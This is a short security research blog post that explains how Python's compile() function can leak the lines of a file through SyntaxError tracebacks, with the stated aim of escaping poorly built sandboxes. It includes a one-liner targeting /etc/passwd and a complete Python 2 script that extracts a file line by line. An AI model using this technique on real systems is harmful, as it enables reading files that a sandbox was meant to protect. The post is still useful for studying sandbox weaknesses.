---
layout: post
title: Python Compile Leak Bug 
published: true
categories: [Research]
excerpt: I was trying to break out of a python sandbox back in October, when I discovered a by-design bug.
---

I was trying to break out of a python sandbox back in October, when I discovered a by-design bug.

---

# Leaking files with `compile()`in Python

### Background

I was trying to break out of a python sandbox back in October, when I asked [this question](https://security.stackexchange.com/q/219320/169503) on Stackexchange (but no one answered...)

By using the `compile` function and throwing an error by `return`ing it early, we can leak the first line of any file that we have access permissions to. 

Now, you may ask:     
>But Isopach, what's the use of leaking a file that you already have permissions to read? Why not just `cat` it? 

And to be honest, on hindsight this isn't even a noteworthy bug to write about. 

BUT! You can use this for escaping improperly implemented sandboxes, i.e. sandboxes that did not remove the `compile` function. So even if you cannot `cat` the file directly, you will be able to leak them.

So, onto the bug!

### Bug

By running `compile('yield', '/etc/passwd', 'exec')`, we are able to leak the first line of any file.

While it is useful in many cases, often we want to see the whole file, right?

To do this, since python interprets files line-by-line, we can delay the termination error simply by adding a new line `\n` to leak a line at a time.

For example, let's make `/tmp/passwd`:
```
$ cat /tmp/passwwd
line 1
line 2 
line 3
line 4
```

We will be able to read the first line with 0 `\n` like as above, but when we run `compile('\nyield', '/tmp/passwd', 'exec')`, it returns `line 2`!

### Exploit 

We'll be able to get every line by catching the `Traceback` and storing it in a variable, then printing it out for every line like this:

```
import traceback
import sys


for i in range(0,100):
    line_number = '\n' * i
    payload = line_number + 'yield'
    try:
        compile(payload, sys.argv[1], 'exec')
    except SyntaxError, err:
        try:
            exc_info = sys.exc_info()
            
        finally:
            traceback.print_exception(*exc_info)
            del exc_info
```

Change the upper limit in `range` depending on file length.

Thanks for reading!
